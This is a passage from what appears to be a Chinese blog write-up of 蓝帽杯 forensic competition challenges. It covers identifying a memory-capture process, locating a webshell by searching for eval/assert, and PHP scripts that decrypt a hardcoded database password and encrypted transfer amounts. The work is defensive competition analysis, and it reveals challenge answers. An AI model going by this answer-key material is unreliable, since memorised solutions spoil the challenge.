	Disabled</span><br><span class="line">2548    2648	SearchProtocol	0xfa800ed78720	7	316	0	False	2022-04-28 05:52:53.000000 	N/A	Disabled</span><br><span class="line">2872    2044	notepad.exe	0xfa800ec2e6f0	1	62	1	False	2022-04-28 05:54:13.000000 	N/A	Disabled</span><br><span class="line">2192    2044	MagnetRAMCaptu	0xfa800f103b30	16	333	1	True	2022-04-28 05:54:30.000000 	N/A	Disabled</span><br><span class="line">3880    2436	360speedld.exe	0xfa800ea7b910	4	94	1	True	2022-04-28 05:54:54.000000 	N/A	Disabled</span><br><span class="line">3604    660	dllhost.exe	0xfa800ef76b30	6	91	1	False	2022-04-28 05:54:55.000000 	N/A	Disabled</span><br></pre></td></tr></table></figure><p>可以看到有个 MagnetRAMCaptu，一看就是制作内存镜像的，PID 就是答案。</p><h3 id="网站取证-1">网站取证_1</h3><p>直接搜索常见的木马特征如 <code>assert</code> <code>eval</code> 等发现直接找到了。</p><p>后门在 <code>runtime\temp</code> 目录下。</p><h3 id="网站取证-2">网站取证_2</h3><p>直接源码搜索“数据库”，发现有个 <code>database.php</code> 规定了数据库有关信息。</p><p>引用了 <code>encrypt/encrypt.php</code>，并且密码由 <code>my_encrypt()</code> 生成。</p><p>继续跟进，找到函数 my_encrypt，运行即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&quot;&quot;</span>,MCRYPT_MODE_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dencrypted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到答案 <code>KBLT123</code></p><h3 id="网站取证-3">网站取证_3</h3><p>发现金额有关的变量名都和 <code>money</code> 有关，源码搜索，发现 <code>$param['money'] = $this-&gt;encrypt($param['money']);</code></p><p>查看 encrypt 函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span> = <span class="string">&#x27;jyzg123456&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$x</span>  = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$l</span>  = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$char</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$l</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>&#123;<span class="variable">$x</span>&#125;;</span><br><span class="line">        <span class="variable">$x</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$i</span>&#125;) + (<span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>&#123;<span class="variable">$i</span>&#125;)) % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现 Salt 就是 <code>jyzg123456</code>。</p><h3 id="网站取证-4">网站取证_4</h3><p>把数据库中表以及列的作用都弄明白：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;id&quot; <span class="keyword">IS</span> <span class="string">&#x27;用户id&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;name&quot; <span class="keyword">IS</span> <span class="string">&#x27;用户名&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;password&quot; <span class="keyword">IS</span> <span class="string">&#x27;用户密码&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;role&quot; <span class="keyword">IS</span> <span class="string">&#x27;用户权限角色</span></span><br><span class="line"><span class="string">1：超级管理员</span></span><br><span class="line"><span class="string">2：系统管理员</span></span><br><span class="line"><span class="string">3：仓库管理员</span></span><br><span class="line"><span class="string">4：门店管理员</span></span><br><span class="line"><span class="string">5：分销商</span></span><br><span class="line"><span class="string">6：装修公司</span></span><br><span class="line"><span class="string">7：业务员</span></span><br><span class="line"><span class="string">8：技术员&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;state&quot; <span class="keyword">IS</span> <span class="string">&#x27;激活状态（1：激活使用  ，2：暂停使用）&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;belong_to&quot; <span class="keyword">IS</span> <span class="string">&#x27;所属门店&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;nick_name&quot; <span class="keyword">IS</span> <span class="string">&#x27;用户姓名&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;sex&quot; <span class="keyword">IS</span> <span class="string">&#x27;性别（1：男   2：女）&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;tel&quot; <span class="keyword">IS</span> <span class="string">&#x27;联系电话&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;address&quot; <span class="keyword">IS</span> <span class="string">&#x27;地址&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;report_num&quot; <span class="keyword">IS</span> <span class="string">&#x27;业务员最大报备数&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_user&quot;.&quot;is_create_time&quot; <span class="keyword">IS</span> <span class="string">&#x27;创建时间&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">TABLE</span> &quot;public&quot;.&quot;tab_user&quot; <span class="keyword">IS</span> <span class="string">&#x27;用户表&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> &quot;public&quot;.&quot;tab_user&quot; <span class="keyword">VALUES</span> (<span class="number">3</span>, <span class="string">&#x27;张宝&#x27;</span>, <span class="string">&#x27;967ee505bd742d713528ad2e55a04bba&#x27;</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;158720003133&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;2018-04-09 19:00:00&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> &quot;public&quot;.&quot;tab_user&quot; <span class="keyword">VALUES</span> (<span class="number">4</span>, <span class="string">&#x27;李进&#x27;</span>, <span class="string">&#x27;34b5c38d19b3352df6db3e976b237d37&#x27;</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;18765877676&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;2018-04-09 19:00:00&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> &quot;public&quot;.&quot;tab_user&quot; <span class="keyword">VALUES</span> (<span class="number">5</span>, <span class="string">&#x27;王子豪&#x27;</span>, <span class="string">&#x27;f783ca62ff21833fdcfe3b74e1a82e1c&#x27;</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;王子豪&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;2020-04-18 16:04:53&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> &quot;public&quot;.&quot;tab_user&quot; <span class="keyword">VALUES</span> (<span class="number">6</span>, <span class="string">&#x27;赵燕&#x27;</span>, <span class="string">&#x27;bca725be29834465fa5a9e3bc6423b48&#x27;</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;赵燕&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;2020-04-18 16:06:06&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> &quot;public&quot;.&quot;tab_user&quot; <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;superAdmin&#x27;</span>, <span class="string">&#x27;ca6d00723bc83590c909b0decc97e34d&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;158736346560&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;2018-04-08 18:02:21&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> &quot;public&quot;.&quot;tab_user&quot; <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;aa590a519a1c4862c5051a9bb0e07456&#x27;</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;158736377751&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;2018-04-09 18:22:21&#x27;</span>);</span><br><span class="line"></span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;order_num&quot; <span class="keyword">IS</span> <span class="string">&#x27;订单号&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;currency&quot; <span class="keyword">IS</span> <span class="string">&#x27;币种&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;remark&quot; <span class="keyword">IS</span> <span class="string">&#x27;备注&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;is_create_time&quot; <span class="keyword">IS</span> <span class="string">&#x27;创建时间&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;payee_id&quot; <span class="keyword">IS</span> <span class="string">&#x27;收款人ID&#x27;</span>;</span><br><span class="line">COMMENT <span class="keyword">ON</span> <span class="keyword">COLUMN</span> &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;payer_id&quot; <span class="keyword">IS</span> <span class="string">&#x27;付款人ID&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of tab_channel_order_list</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> &quot;public&quot;.&quot;tab_channel_order_list&quot; <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;271188138699&#x27;</span>, <span class="string">&#x27;GG币&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;2022-04-01 00:00:50&#x27;</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="string">&#x27;nJ1xlG5v&#x27;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> &quot;public&quot;.&quot;tab_channel_order_list&quot; <span class="keyword">VALUES</span> (<span class="number">5000</span>, <span class="string">&#x27;622260854407&#x27;</span>, <span class="string">&#x27;GG币&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;2022-04-30 23:55:13&#x27;</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="string">&#x27;lJRvnWtr&#x27;</span>);</span><br></pre></td></tr></table></figure><p>将语句处理成易于读取的格式：</p><p><code>data.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(1, &#x27;271188138699&#x27;, &#x27;2022-04-01 00:00:50&#x27;, 4, 2, &#x27;nJ1xlG5v&#x27;)</span><br><span class="line">(2, &#x27;272206877227&#x27;, &#x27;2022-04-01 00:23:01&#x27;, 4, 3, &#x27;lpZqmGps&#x27;)</span><br><span class="line">...</span><br><span class="line">(4998, &#x27;331754109613&#x27;, &#x27;2022-04-30 23:32:04&#x27;, 6, 2, &#x27;mplrlW9p&#x27;)</span><br><span class="line">(4999, &#x27;109211499552&#x27;, &#x27;2022-04-30 23:35:25&#x27;, 4, 6, &#x27;mphwnXBr&#x27;)</span><br><span class="line">(5000, &#x27;622260854407&#x27;, &#x27;2022-04-30 23:55:13&#x27;, 4, 3, &#x27;lJRvnWtr&#x27;)</span><br></pre></td></tr></table></figure><p><code>exchange_rate.txt</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;1&#x27;, 0.05, &#x27;2022-04-01&#x27;)</span><br><span class="line">(&#x27;2&#x27;, 0.04, &#x27;2022-04-02&#x27;)</span><br><span class="line">(&#x27;3&#x27;, 0.06, &#x27;2022-04-03&#x27;)</span><br><span class="line">(&#x27;4&#x27;, 0.05, &#x27;2022-04-04&#x27;)</span><br><span class="line">(&#x27;5&#x27;, 0.07, &#x27;2022-04-05&#x27;)</span><br><span class="line">(&#x27;6&#x27;, 0.10, &#x27;2022-04-06&#x27;)</span><br><span class="line">(&#x27;7&#x27;, 0.15, &#x27;2022-04-07&#x27;)</span><br><span class="line">(&#x27;8&#x27;, 0.17, &#x27;2022-04-08&#x27;)</span><br><span class="line">(&#x27;9&#x27;, 0.23, &#x27;2022-04-09&#x27;)</span><br><span class="line">(&#x27;10&#x27;, 0.22, &#x27;2022-04-10&#x27;)</span><br><span class="line">(&#x27;11&#x27;, 0.25, &#x27;2022-04-11&#x27;)</span><br><span class="line">(&#x27;12&#x27;, 0.29, &#x27;2022-04-12&#x27;)</span><br><span class="line">(&#x27;13&#x27;, 0.20, &#x27;2022-04-13&#x27;)</span><br><span class="line">(&#x27;14&#x27;, 0.28, &#x27;2022-04-14&#x27;)</span><br><span class="line">(&#x27;15&#x27;, 0.33, &#x27;2022-04-15&#x27;)</span><br><span class="line">(&#x27;16&#x27;, 0.35, &#x27;2022-04-16&#x27;)</span><br><span class="line">(&#x27;17&#x27;, 0.35, &#x27;2022-04-17&#x27;)</span><br><span class="line">(&#x27;18&#x27;, 0.37, &#x27;2022-04-18&#x27;)</span><br><span class="line">(&#x27;19&#x27;, 0.38, &#x27;2022-04-19&#x27;)</span><br><span class="line">(&#x27;20&#x27;, 0.40, &#x27;2022-04-20&#x27;)</span><br><span class="line">(&#x27;21&#x27;, 0.38, &#x27;2022-04-21&#x27;)</span><br><span class="line">(&#x27;22&#x27;, 0.39, &#x27;2022-04-22&#x27;)</span><br><span class="line">(&#x27;23&#x27;, 0.45, &#x27;2022-04-23&#x27;)</span><br><span class="line">(&#x27;24&#x27;, 0.44, &#x27;2022-04-24&#x27;)</span><br><span class="line">(&#x27;25&#x27;, 0.50, &#x27;2022-04-25&#x27;)</span><br><span class="line">(&#x27;26&#x27;, 0.55, &#x27;2022-04-26&#x27;)</span><br><span class="line">(&#x27;27&#x27;, 0.51, &#x27;2022-04-27&#x27;)</span><br><span class="line">(&#x27;28&#x27;, 0.52, &#x27;2022-04-28&#x27;)</span><br><span class="line">(&#x27;29&#x27;, 0.53, &#x27;2022-04-29&#x27;)</span><br><span class="line">(&#x27;30&#x27;, 0.50, &#x27;2022-04-30&#x27;)</span><br></pre></td></tr></table></figure><p>然后提取出题目要求的转账记录，根据前一题的加密脚本解密，然后按照汇率转成 RMB，求和即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span> = <span class="string">&#x27;jyzg123456&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$char</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$l</span>) &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) - <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>]) + <span class="number">256</span>) % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;exchange_rate.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$rate</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$id</span>, <span class="variable">$x</span>, <span class="variable">$time</span>) = <span class="title function_ invoke__">sscanf</span>(<span class="variable">$str</span>, <span class="string">&quot;(%s %f, %s)&quot;</span>);</span><br><span class="line">    <span class="variable">$rate</span>[] = <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="comment">// 3 -&gt; 5</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$id_1</span>, <span class="variable">$id_2</span>, <span class="variable">$date</span>, <span class="variable">$time</span>, <span class="variable">$to</span>, <span class="variable">$from</span>, <span class="variable">$enc</span>) = <span class="title function_ invoke__">sscanf</span>(<span class="variable">$str</span>, <span class="string">&quot;(%d, %s %s %s %d, %d, %s)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$from</span> != <span class="number">3</span> || <span class="variable">$to</span> != <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$enc</span>, <span class="number">1</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$enc</span>) - <span class="number">3</span>);</span><br><span class="line">    <span class="variable">$date</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$date</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$date</span>) - <span class="number">2</span>, <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$date</span> &lt; <span class="number">1</span> || <span class="variable">$date</span> &gt; <span class="number">17</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$res</span> + <span class="variable">$rate</span>[<span class="variable">$date</span>] * <span class="title function_ invoke__">decrypt</span>(<span class="variable">$enc</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>最后答案是 <code>15758353.76</code></p></div><section class="meta" id="footer-meta"><time class="metatag time" itemprop="dateUpdated" datetime="2022-08-10T11:27:37+08:00" content="2022-08-10 星期三"><i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i> &nbsp;2022-08-10 星期三</time><div class="metatag tags"><a class="tag" href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>&nbsp;蓝帽杯</a></div><div class="metatag share -share-list"><i class="left fas fa-share-alt fa-fw" aria-hidden="true"></i><div class="-share-list share-body"><a class="-share-qq" title="QQ好友" 